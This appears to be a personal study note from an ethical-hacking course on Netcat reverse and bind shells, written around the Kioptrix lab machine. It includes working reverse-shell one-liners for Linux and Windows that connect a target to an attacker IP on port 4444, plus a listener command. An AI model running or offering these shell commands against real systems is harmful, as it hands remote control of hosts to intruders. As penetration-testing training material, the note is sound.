[[Five Stage Of Ethical Hacking]] - The third part of it.
[[Scanning with Nmap]], [[Enumerating SMB]], [[Enumerating SSH]]

**Our target machine:**[[Kioptrix1 (192.168.189.130)]]
### Netcat Reverse Shell
[Manual Page of Netcat](https://linux.die.net/man/1/nc)
[Further Reading of Reverse-Bind Shell](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)
![[Pasted image 20240213073134.png]]

In this example the target connects back to the attack box using port 4444. The –e option sends back a Bash shell to the attack box. Please note that we can also use the –e option with cmd.exe on Windows. Let’s say we have found a remote code execution (RCE) vulnerability on the target host. We can than issue the Netcat command with –e on the target host and initiate a reverse shell with Netcat to issue commands.

Let’s have a look at how this works with the following example where we’ve setup 2 Linux systems with Netcat.

### Netcat reverse shell example

In order to setup a Netcat reverse shell we need to follow the following steps:

```
1. Setup a Netcat listener.
2. Connect to the Netcat listener from the target host.
3. Issue commands on the target host from the attack box.
```

First we setup a Netcat listener on the attack box which is listening on port 4444 with the following command:

> nc –lvp 4444

Than we issue the following command on the target host to connect to our attack box (remember we have remote code execution on this box):

For Linux:

> nc 192.168.100.113 4444 –e /bin/bash

For Windows:

> nc.exe 192.168.100.113 4444 –e cmd.exe

On the attack box we now have a bash shell on the target host and we have full control over this box in the context of the account which initiated the reverse shell. In this case the root user initiated the shell which means we have root privileges on the target host.

![[Pasted image 20240213073251.png]]

### Netcat Bind Shell

As we’ve mentioned earlier in this Hacking with Netcat tutorial a bind shell is a shell that binds to a specific port on the target host to listen for incoming connections. Let’s have a look at the visualization of a bind Netcat shell:

![[Pasted image 20240213073346.png]]

In this visualization the target binds a Bash shell to port 4444 using a Netcat listener. The attacker connects to this port using a simple Netcat command. The steps to setup a bind shell are as following:

```
1. Bind a bash shell to port 4444 using Netcat.
2. Connect to the target host on port 4444 from the attack box.
3. Issue commands on the target host from the attack box.
```

![[Pasted image 20240213073543.png]]